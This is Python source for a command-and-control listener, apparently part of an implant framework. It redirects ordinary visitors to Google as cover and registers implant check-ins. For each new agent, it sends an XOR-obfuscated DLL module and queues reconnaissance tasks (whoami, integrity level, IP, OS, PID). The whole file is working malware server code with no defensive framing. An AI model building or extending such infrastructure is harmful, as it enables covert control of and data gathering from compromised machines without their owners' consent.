import json
import os
import hashlib

from aiohttp import web
from connect.convert import string_to_base64, xor_base64
from connect.output import display
from connect.server.models import AgentModel, get_session, ImplantModel, TaskModel


class ListenerRoutes:

    def __init__(self, aiohttp_app, sio_client, task_manager):
        self.sio_client = sio_client
        self.aiohttp_app = aiohttp_app
        self.aiohttp_app.router.add_get(r'/{route:[^\/socket.io\/].*}', self.dummy_route)
        self.aiohttp_app.router.add_post('/{route:.*}', self.check_in)
        self.task_manager = task_manager

    @staticmethod
    async def dummy_route(request):
        route = request.match_info.get('route')
        display(f'{request.remote} requested /{route} redirecting them to google', 'INFORMATION')
        return web.HTTPFound("https://www.google.com")

    async def check_in(self, request):
        try:
            batch_response = await request.json()
        except json.decoder.JSONDecodeError:
            #data = request.get_data().decode('utf-8')
            #display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
            return web.HTTPFound("https://www.google.com")

        with get_session() as session:
            if isinstance(batch_response, dict):
                display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
                implant = session.query(ImplantModel).filter_by(key=batch_response['id']).first()
                if not implant:
                    display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
                    return web.HTTPFound("https://www.google.com")
                return web.Response(text=self.create_agent(implant, session))
            batch_request = self.task_manager.parse_batch_response(batch_response)
            return web.json_response(batch_request)

    def create_agent(self, implant, session):
        agent = AgentModel(implant=implant)
        module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
        module_md5 = hashlib.md5(module_bytes).hexdigest()
        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(
            agent.loaded_modules) + f',{module_md5}'
        module, key = xor_base64(module_bytes)
        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
        load_task = TaskModel(agent=agent, method='load', type=-1, parameters=parameters, misc='')
        whoami_task = TaskModel(agent=agent, method='whoami', type=-1, parameters='', misc='')
        integrity_task = TaskModel(agent=agent, method='integrity', type=-1, parameters='', misc='')
        ip_task = TaskModel(agent=agent, method='ip', type=-1, parameters='', misc='')
        os_task = TaskModel(agent=agent, method='os', type=-1, parameters='', misc='')
        pid_task = TaskModel(agent=agent, method='pid', type=-1, parameters='', misc='')
        session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
        session.commit()
        self.sio_client.emit('proxy', json.dumps(['information', f'Created agent {agent.id} sending it to implant {implant.id}']))
        session.close()
        return str(agent.check_in_task_id)